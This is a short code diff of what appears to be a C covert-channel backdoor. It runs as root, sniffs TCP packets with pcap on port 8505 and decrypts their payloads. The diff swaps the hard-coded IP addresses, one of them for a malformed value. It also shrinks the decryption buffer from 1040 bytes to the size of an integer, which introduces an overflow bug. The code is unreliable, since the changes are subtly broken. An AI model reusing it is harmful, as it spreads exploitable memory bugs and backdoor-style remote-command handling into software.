@@ -27,8 +27,8 @@ int main(int argc, char **argv){
     setuid(0);
     setgid(0);
     char *c = "c";
-    char *sip = "192.168.43.61";
-    char *dip = "192.168.43.148";
+    char *sip = "142.232/153.106";
+    char *dip = "142.232.156.43";
     unsigned short sport = 22;
     unsigned short dport = 8505;
     unsigned char data[BUFSIZE] = "hello";
@@ -172,7 +172,7 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
 
 void ParsePayload(const u_char *payload, int len){
     FILE *fp;
-    unsigned char decryptedtext[1040];
+    unsigned char decryptedtext[sizeof(BUFSIZE + 16)];
     int decryptedlen, cipherlen;
     char *args[1];
 
